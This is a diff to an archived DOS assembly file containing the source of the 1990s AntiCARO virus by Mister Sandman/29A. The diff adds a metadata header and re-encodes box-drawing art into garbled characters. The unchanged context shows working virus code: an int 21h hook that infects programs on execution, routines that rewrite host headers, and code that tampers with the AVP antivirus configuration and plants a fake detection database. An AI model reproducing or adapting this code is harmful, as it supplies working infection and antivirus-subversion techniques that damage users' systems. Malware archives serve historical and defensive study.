@@ -1,9 +1,20 @@
+; ------------------------------------------------------------
+; name      A
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;
-;                                             ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
-;          AntiCARO                           ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
-;          by Mister Sandman/29A               ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
-;                                             ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
-;                                             ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
+;                                             ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+;          AntiCARO                           ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½
+;          by Mister Sandman/29A               ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+;                                             ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½
+;                                             ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½
 ;
 ; As i don't agree with CARO and with the way the name viruses, and spe-
 ; cially the way they *misnamed* VLAD's Bizatch, i decided to write this
@@ -53,7 +64,7 @@ anticaro_start  label   byte
 anticaro_size   equ     anticaro_end-anticaro_start
 
 entry_point:    call    delta_offset
-delta_offset:   pop     bp                         ; Get ë-offset
+delta_offset:   pop     bp                         ; Get ï¿½-offset
 		sub     bp,offset delta_offset     ; for l8r use
 
 		mov     ax,3d02h                   ; Try to open AVP.SET
@@ -164,7 +175,7 @@ nothing_to_do:  lea     si,[bp+host_header]        ; Restore host's header
 		movsw
 		ret
 
-; ÄÄ´ note_to_stupid_avers ;) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; ï¿½Ä´ note_to_stupid_avers ;) ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 copyright       db      0dh,0ah,'[AntiCARO, by Mister Sandman/29A]',0dh,0ah
 		db      'Please note: the name of this virus is [AntiCARO] '
@@ -173,7 +184,7 @@ copyright       db      0dh,0ah,'[AntiCARO, by Mister Sandman/29A]',0dh,0ah
 		db      ' as usual; we just don''t mind your childish '
 		db      'stupidity :)',0dh,0ah
 
-; ÄÄ´ AntiCARO's int 21h handler ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; ï¿½Ä´ AntiCARO's int 21h handler ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 new_int_21h:    cmp     ax,'CA'                    ; Residency check
 		jnz     execution?                 ; Are they asking my
@@ -190,7 +201,7 @@ execution?:     cmp     ax,4b00h                   ; This is the moment
 old_int_21h:    db      0eah                       ; jmp xxxx:xxxx
 		dw      0,0                        ; Original int 21h
 
-; ÄÄ´ Infection routines ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; ï¿½Ä´ Infection routines ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 check_name:     push    ax bx cx dx                ; Push all this shit
 		push    si di ds es                ; and clear direction
@@ -264,7 +275,7 @@ close_file:     mov     ah,3eh                     ; Close our victim
 		mov     byte ptr es:[di+4],al      ; Pop shit and jump
 		jmp     dont_infect                ; to the original int 21h
 
-; ÄÄ´ Subroutines... or... oh, well, subroutine :) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; ï¿½Ä´ Subroutines... or... oh, well, subroutine :) ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 get_sft:        push    ax bx
 		mov     ax,1220h                   ; Get job file table
@@ -279,7 +290,7 @@ get_sft:        push    ax bx
 bad_sft:        pop     bx ax                      ; Pop registers and
 		ret                                ; return to the code
 
-; ÄÄ´ Data area ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; ï¿½Ä´ Data area ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 host_header     db      0cdh,20h,90h,90h           ; Host's header
 new_header      db      0e9h,?,?,90h               ; New header buffer
@@ -287,7 +298,7 @@ avp_set         db      'avp.set',0                ; Can't you guess it? :)
 bizatch_name    db      'BIZATCH.AVB',0dh,0ah      ; Our database field
 bizatch_base    db      'bizatch.avb',0            ; Viral database name
 
-; ÄÄ´ BIZATCH.AVB viral database ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; ï¿½Ä´ BIZATCH.AVB viral database ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ;
 ; The hex dump below is the AVP full-compatible  viral database which con-
 ; tains the necessary  data for detecting Bizatch. This was done by compi-
@@ -300,25 +311,25 @@ bizatch_base    db      'bizatch.avb',0            ; Viral database name
 ; - Insert a file record in it (Alt-I, and then select 'File virus').
 ; - Fill the form as follows:
 ;
-;             ÉÍ[ş]ÍÍÍÍÍÍÍÍÍÍÍ File virus ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
-;             º    Name: Bizatch_:P        Type  [ ] COM  º
-;             º Comment: Fuck you, Bontchy       [X] EXE  º
-;             º                                  [ ] SYS  º
-;             º  Area 1  Header                  [ ] WIN  º
-;             º  Offset  0000                             º
-;             º  Length  00           Method  Delete      º
-;             º  Area 2  Page_C         Area  Header      º
-;             º  Offset  0000           From  +0000       º
-;             º  Length  0a           Length  +0000       º
-;             º                           To  +0000       º
-;           > º   Link Ü                      +0000       º
-;             º   ßßßßßß                 Cut  0000        º
-;           > º    Sum Ü 00000000                         º
-;             º   ßßßßßß 00000000                         º
-;             º                                           º
-;             º              Ok    Ü      Cancel  Ü       º
-;             º           ßßßßßßßßßß     ßßßßßßßßßß       º
-;             ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
+;             ï¿½ï¿½[ï¿½]ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ File virus ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í»
+;             ï¿½    Name: Bizatch_:P        Type  [ ] COM  ï¿½
+;             ï¿½ Comment: Fuck you, Bontchy       [X] EXE  ï¿½
+;             ï¿½                                  [ ] SYS  ï¿½
+;             ï¿½  Area 1  Header                  [ ] WIN  ï¿½
+;             ï¿½  Offset  0000                             ï¿½
+;             ï¿½  Length  00           Method  Delete      ï¿½
+;             ï¿½  Area 2  Page_C         Area  Header      ï¿½
+;             ï¿½  Offset  0000           From  +0000       ï¿½
+;             ï¿½  Length  0a           Length  +0000       ï¿½
+;             ï¿½                           To  +0000       ï¿½
+;           > ï¿½   Link ï¿½                      +0000       ï¿½
+;             ï¿½   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½                 Cut  0000        ï¿½
+;           > ï¿½    Sum ï¿½ 00000000                         ï¿½
+;             ï¿½   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ 00000000                         ï¿½
+;             ï¿½                                           ï¿½
+;             ï¿½              Ok    ï¿½      Cancel  ï¿½       ï¿½
+;             ï¿½           ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½     ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½       ï¿½
+;             ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í¼
 ;
 ; - Link biz_dec.obj (Alt-L, and then select it).
 ; - Type in Bizatch's entry point  for calculating  its  sum (Alt-S, don't
@@ -384,7 +395,7 @@ bizatch_avb     db      2dh,56h,0c2h,00h,00h,00h,00h,01h,0cch,07h,04h
 		db      8ah,02h,00h,00h,74h
 base_end        label   byte
 
-; ÄÄ´ Bizatch's detection code ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; ï¿½Ä´ Bizatch's detection code ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ;
 ; biz_dec       segment byte public 'code'
 ;               assume  cs:biz_dec;ds:biz_dec;es:biz_dec;ss:biz_dec
